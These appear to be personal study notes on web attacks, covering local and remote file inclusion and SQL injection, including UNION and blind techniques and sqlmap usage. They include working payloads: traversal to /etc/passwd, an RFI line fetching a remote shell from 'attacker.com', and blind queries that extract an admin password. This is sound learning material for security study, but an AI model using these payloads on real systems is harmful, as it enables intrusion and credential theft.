# File Inclusion
## Types :
1. Local File Inclusion (LFI) :
	- Allows an attacker to include files that are present in the target's server, it can result in reading sensitive files etc.
2. Remote File Inclusion (RFI) :
	- Allows an attacker to include files from external location, it can lead to code execution etc.

## Why it happens :
- Takes input from a user, and using that path to a file without properly validating it :
	e.g. : If an app allows language change, we can instead of sending Russian as input, we send `../../../` to achieve directory traversal, allowing us to travel back up to the root directory, and then appending `etc/passwd` to include the ***passwd file*** 
- Sometimes controls are put in place to prevent that from happening, but some controls such as `removing ../` if not done **recursively** may be ineffective.

## Basic Payloads :
1. LFI :
	- `etc/passwd`
	- `../../../etc/passwd` 
2. RFI :
	- `http://attacker.com/malicious.php`  //to execute a remote shell
- You can use `PHP wrappers` ( e.g. `php://filter` that allows us to read `php files` ) to bypass restrictions, Double encoding, recursive payloads ( adding a `../` between each `.<it goes here>./` ) etc.
- It's really good to know what language is being used server-side (PHP, JSP, ASP, etc.)
- We can also consider Fuzzing
- More payloads can be found in the `PayloadsAllTheThings` repo on `GitHub` 

# SQL injection

- One of the first thing we would do to check for SQLi is to test with `" and '` since they can break the SQL statement and return an `error`  .
- Next we would try `Logical operators` : `AND & OR` .
- Whenever you're thinking about SQLi, Also think about everything you're supplying to the application (headers, cookies etc.) and how it might be used : e.g. 
	- if the app automatically detects your browser, and says hey I suggest this plugin instead of this, you might think > Maybe it's using the `User-Agent:` and processing it in some way, and then you would suspect the user agent and start testing it.
	- Maybe it's the cookie, and so on.
## Terminators :
- `#` and `-- -`  (for MYSQL)  : It ends the SQL query, so anything after this gets ignored.
- Their syntax is different for each DB .

## UNION SELECT
- It let's us retrieve info from other tables and columns that were not initially defined.
- It has a constraint and it's that when we **UNION SELECT** we can **ONLY** select the same number in the original query. So if in the original query we're selecting let's say `username` and `password` well that's `2 columns` then we can only union select 2 items.
- To know the number of those columns we would use `null` , e.g. `jeremy' union select null-- -` and we keep incrementing the number of `null` till we get a normal response : `jeremy' union select null,null,null-- -` 
- One other constraint is that we can only select `1 type of data` so for example : 
	- Only integers or only strings etc. , if the data that we're trying to get (e.g. email > string and ID > integer ) we will get an ***Error*** 

## Some syntax
- Note : the syntax differs from a DB to another :
1. `version()` > _to get the version of the DB used
2.  `table_name from information_schema.tables` > _to get the table names from the DB
3.  `column_name from information_schema.columns` > _to get the column names 
- You can check *PORTSWIGGER* SQL cheat sheet for those diff syntax.

## sqlmap
- It's a tool that tests for SQLi > `sqlmap -r req.txt` or you can use a `url` instead, for more info enter the following command in the terminal : `sqlmap -h`
- To inject for some specific stuff like `cookies` you would need to increase the level to at least 2 > `--level=2`   

## BLIND SQLi
- It's called **Blind** since the : `query is only changing the behavior of the app, it won't give us back any data, it wonly only give us a change in behavior` 
- So we will have to create payloads that produce `true` `false` output, and based on the behavior, *we can slowly extract data* (e.g. is the first character of the password is `a` )

- The function we use to get the information is called : `substring`  and it's syntax is the following : `substr(string, start, length)` or `substr(string from start for length)` :
	  1. `' and substr("voidpacket", 1, 1) = "v"#`  > This should return `true` since the first `char` in the `string` is `v` .
	  2. `' and substr("voidpacket", 1, 3) = "voi"#`  > This should return `true` since the first `char` in the `string` is `voi` .
But here we don't want to use strings that we provide, we want strings provided by the DB, so our payload will look like this :
	3. `' and substr((select version()), 1, 1) = "8"#`
	4. `' and substr((select password from injection0x02 where username = 'admin'), 1, 1) = 'a'#`
- Remember that sometimes when comparing `Upper case letters` with `Lower Case Letters` can still return `true` .  